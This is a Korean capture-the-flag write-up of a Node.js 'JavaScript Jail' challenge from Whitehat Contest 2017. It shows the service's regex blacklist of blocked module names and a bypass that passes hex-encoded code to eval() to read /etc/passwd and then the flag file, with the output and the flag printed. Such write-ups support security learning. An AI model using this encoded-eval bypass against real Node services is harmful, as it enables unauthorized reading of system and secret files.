# Whitehat Contest 2017 - [misc] Jail

### Description

> nc challenges.whitehatcontest.kr 5959

<br>

### Analysis

바로 nc로 붙어보니 `hint, quit` 문구가 보인다.

```
$ nc challenges.whitehatcontest.kr 5959
Hello Java-Script Jail
type: hint, quit
> 
```

<br>

hint를 입력해보니 다음과 같이 RegExp 정규 표현식 안에 문자열이 쭈르륵 나열되었다. 음?

```
> hint
(input) => (new RegExp(/with|\.|;|new| |'|child|crypto|os|http|dns|net|tr|tty|zlib|punycode|util|url|ad|nc|>|`|\+|ex|=/i).test(input))
```

<br>

아무 문자열이나 입력해보았다.

리스트에 포함되지 않는 문자는 hm..이라는 응답이 오고

포함되는 문자는 nop 응답이 돌아오는 것으로 보아 필터링인 것을 알 수 있었다.

```
$ nc challenges.whitehatcontest.kr 5959
Hello Java-Script Jail
type: hint, quit
> test
hm..

$ nc challenges.whitehatcontest.kr 5959
Hello Java-Script Jail
type: hint, quit
> os
nop
```

<br>

그러나 많은 필터링 리스트에 eval() 함수가 빠져있다.

eval() 함수 + 인코딩으로 필터링 우회가 가능할 것 같다.

<br>

### Exploit

[node.js][node.js] API 문서를 참고해보니 readFileSync() 함수를 사용하여 js 파일 시스템에 접근이 가능했다.

파일 시스템 접근을 위해 'fs' 모듈을 임포트 해줘야 하므로 with 함수와 require를 함께 사용했다.

> query:  with(require('fs')){readFileSync('/etc/passwd')}
>
> encoded:  \x77\x69\x74\x68\x28\x72\x65\x71\x75\x69\x72\x65\x28\x27\x66\x73\x27\x29\x29\x7b\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79\x6e\x63\x28\x27\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x27\x29\x7d

```
$ nc challenges.whitehatcontest.kr 5959
Hello Java-Script Jail
type: hint, quit
> eval("\x77\x69\x74\x68\x28\x72\x65\x71\x75\x69\x72\x65\x28\x27\x66\x73\x27\x29\x29\x7b\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79\x6e\x63\x28\x27\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x27\x29\x7d")
your input root:x:0:0:root:/root:/bin/ash
.
.
.
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000:Linux User,,,:/home/node:/bin/sh
jail:x:1001:1001:Linux User,,,:/home/jail:
```

<br>

눈에 익은 계정이 하나 보인다. 

계정 디렉터리 아래 플래그가 있는지 확인해보았다.

```
$ nc challenges.whitehatcontest.kr 5959
Hello Java-Script Jail
type: hint, quit
> eval("\x77\x69\x74\x68\x28\x72\x65\x71\x75\x69\x72\x65\x28\x27\x66\x73\x27\x29\x29\x7b\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79\x6e\x63\x28\x27\x2f\x68\x6f\x6d\x65\x2f\x6a\x61\x69\x6c\x2f\x66\x6c\x61\x67\x27\x29\x7d")
your input flag is {easy~esay!easy?_Jav4-scr1pt~yay}
```

flag is

***easy~esay!easy?_Jav4-scr1pt~yay***



[node.js]: https://nodejs.org/api/fs.html